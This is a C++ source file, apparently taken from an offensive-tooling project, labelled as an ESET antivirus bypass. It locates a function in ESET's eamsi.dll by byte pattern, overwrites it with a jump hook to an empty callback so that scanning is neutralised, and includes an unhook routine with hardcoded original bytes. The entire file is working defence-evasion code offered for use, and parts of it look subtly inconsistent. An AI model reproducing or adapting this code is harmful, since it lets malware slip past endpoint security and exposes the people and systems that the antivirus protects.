// eset bypass (sxvm skidded)

#include "eset.h"
#include <Psapi.h>
#include <TlHelp32.h>
#include <vector>
#include <string>
#include <algorithm>
#pragma comment(lib,"Psapi.lib")

LPVOID esetbypass::searchaob(std::vector<BYTE> pattern, std::string mask, std::string modulename) {
    HMODULE hmodule = GetModuleHandleA(modulename.c_str());
    if (!hmodule) return nullptr;

    MODULEINFO modinfo;
    if (!GetModuleInformation(GetCurrentProcess(), hmodule, &modinfo, sizeof(modinfo))) {
        return nullptr;
    }

    BYTE* base = (BYTE*)modinfo.lpBaseOfDll;
    SIZE_T size = modinfo.SizeOfImage;

    for (SIZE_T i = 0; i < size - pattern.size(); i++) {
        bool found = true;
        for (SIZE_T j = 0; j < pattern.size(); j++) {
            if (mask[j] == 'x' && base[i + j] != pattern[j]) {
                found = false;
                break;
            }
        }
        if (found) {
            return (LPVOID)(base + i);
        }
    }

    return nullptr;
}

bool esetbypass::hookfunction(LPVOID address, esetcallback callback) {
    if (!address || !callback) return false;

    hookedaddress = address;
    originalfunction = (esetcallback)address;

    BYTE jmp[14];
#ifdef _WIN64
    jmp[0] = 0xFF; // jmp [rip+0]
    jmp[1] = 0x25;
    jmp[2] = 0x00;
    jmp[3] = 0x00;
    jmp[4] = 0x00;
    jmp[5] = 0x00;
    *(ULONG_PTR*)&jmp[6] = (ULONG_PTR)callback;
#else
    jmp[0] = 0xE9; // jmp rel32
    *(DWORD*)&jmp[1] = (DWORD)callback - (DWORD)address - 5;
#endif

    DWORD oldprotect;
    if (!VirtualProtect(address, sizeof(jmp), PAGE_EXECUTE_READWRITE, &oldprotect)) {
        return false;
    }

    memcpy(address, jmp, sizeof(jmp));
    VirtualProtect(address, sizeof(jmp), oldprotect, &oldprotect);
    FlushInstructionCache(GetCurrentProcess(), address, sizeof(jmp));

    return true;
}

bool esetbypass::unhook() {
    if (!hookedaddress || !originalfunction) return false;

    BYTE originalbytes[14];
#ifdef _WIN64
    originalbytes[0] = 0x48; // sub rsp,28h
    originalbytes[1] = 0x83;
    originalbytes[2] = 0xEC;
    originalbytes[3] = 0x28;
    originalbytes[4] = 0xE8; // call rel32
    originalbytes[5] = 0xBB;
    originalbytes[6] = 0xFF;
    originalbytes[7] = 0xFF;
    originalbytes[8] = 0xFF;
    originalbytes[9] = 0x48; // neg rax
    originalbytes[10] = 0xF7;
    originalbytes[11] = 0xD8;
    originalbytes[12] = 0x1B; // sbb eax,eax
    originalbytes[13] = 0xC0;
#else
    originalbytes[0] = 0x55; // push ebp
    originalbytes[1] = 0x8B; // mov ebp,esp
    originalbytes[2] = 0xEC;
    originalbytes[3] = 0x83; // add esp,-8
    originalbytes[4] = 0xC4;
    originalbytes[5] = 0xF8;
#endif

    DWORD oldprotect;
    if (!VirtualProtect(hookedaddress, sizeof(originalbytes), PAGE_EXECUTE_READWRITE, &oldprotect)) {
        return false;
    }

    memcpy(hookedaddress, originalbytes, sizeof(originalbytes));
    VirtualProtect(hookedaddress, sizeof(originalbytes), oldprotect, &oldprotect);
    FlushInstructionCache(GetCurrentProcess(), hookedaddress, sizeof(originalbytes));

    return true;
}

void esetbypass::bypasscallback() {
}

bool esetbypass::bypass() {
    std::vector<BYTE> pattern = { 0x48,0x83,0xEC,0x28,0xE8,0xBB,0xFF,0xFF,0xFF,0x48,0xF7,0xD8,0x1B,0xC0,0xF7,0xD8 };
    std::string mask = "xxxxxxxxxxxxxxxx";
    LPVOID esetaddress = searchaob(pattern, mask, "eamsi.dll");
    if (!esetaddress) return false;
    if (!hookfunction(esetaddress, bypasscallback)) {
        return false;
    }
    LPTOP_LEVEL_EXCEPTION_FILTER oldfilter = SetUnhandledExceptionFilter([](EXCEPTION_POINTERS* ep) -> LONG {
        return EXCEPTION_CONTINUE_SEARCH;
        });
    esetcallback func = (esetcallback)esetaddress;
    func();
    SetUnhandledExceptionFilter(oldfilter);
    return true;
}